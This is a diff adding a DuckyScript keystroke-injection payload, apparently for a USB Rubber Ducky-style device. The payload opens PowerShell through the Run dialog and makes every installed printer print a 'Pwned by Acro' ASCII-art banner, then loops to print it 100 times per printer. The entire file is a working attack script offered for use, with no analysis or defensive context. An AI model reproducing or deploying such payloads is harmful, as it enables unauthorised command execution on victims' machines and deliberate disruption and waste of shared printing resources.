@@ -1,0 +1,104 @@
+DELAY 1000
+GUI R
+DELAY 600
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING Get-Printer | ForEach-Object {Out-Printer -InputObject "
+SHIFT ENTER
+DELAY 400
+STRING   _____                          _   _                                    
+SHIFT ENTER
+DELAY 200
+STRING  |  __ \                        | | | |               /\                  
+SHIFT ENTER
+DELAY 200
+STRING  | |__) |_      ___ __   ___  __| | | |__  _   _     /  \   ___ _ __ ___  
+SHIFT ENTER
+DELAY 200
+STRING  |  ___/\ \ /\ / / '_ \ / _ \/ _` | | '_ \| | | |   / /\ \ / __| '__/ _ \
+SHIFT ENTER
+DELAY 200
+STRING  | |     \ V  V /| | | |  __/ (_| | | |_) | |_| |  / ____ \ (__| | | (_) |
+SHIFT ENTER
+DELAY 200
+STRING  |_|      \_/\_/ |_| |_|\___|\__,_| |_.__/ \__, | /_/    \_\___|_|  \___/ 
+SHIFT ENTER
+DELAY 200
+STRING                                             __/ |                         
+SHIFT ENTER
+DELAY 200
+STRING                                            |___/                          
+SHIFT ENTER
+DELAY 200
+STRING "}
+DELAY 200
+ENTER
+DELAY 5000
+GUI R
+DELAY 600
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING $printers = Get-Printer
+SHIFT ENTER
+DELAY 200
+STRING for ($i = 0; $i -lt 100; $i++)
+SHIFT ENTER 
+DELAY 200
+STRING {
+SHIFT ENTER
+DELAY 200
+STRING       foreach ($printer in $printers)
+SHIFT ENTER
+DELAY 200
+STRING    {
+SHIFT ENTER
+DELAY 200
+STRING        Out-Printer -Name $printer.Name -InputObject "
+SHIFT ENTER
+STRING   _____                          _   _                                    
+SHIFT ENTER
+DELAY 200
+STRING  |  __ \                        | | | |               /\                  
+SHIFT ENTER
+DELAY 200
+STRING  | |__) |_      ___ __   ___  __| | | |__  _   _     /  \   ___ _ __ ___  
+SHIFT ENTER
+DELAY 200
+STRING  |  ___/\ \ /\ / / '_ \ / _ \/ _` | | '_ \| | | |   / /\ \ / __| '__/ _ \
+SHIFT ENTER
+DELAY 200
+STRING  | |     \ V  V /| | | |  __/ (_| | | |_) | |_| |  / ____ \ (__| | | (_) |
+SHIFT ENTER
+DELAY 200
+STRING  |_|      \_/\_/ |_| |_|\___|\__,_| |_.__/ \__, | /_/    \_\___|_|  \___/ 
+SHIFT ENTER
+DELAY 200
+STRING                                             __/ |                         
+SHIFT ENTER
+DELAY 200
+STRING                                            |___/                          
+SHIFT ENTER
+DELAY 200
+STRING "
+SHIFT ENTER
+DELAY 200
+STRING    }
+SHIFT ENTER
+DELAY 200
+STRING } 
+ENTER
+
+
+
+
+ 
+
+ 
+
+
+
+
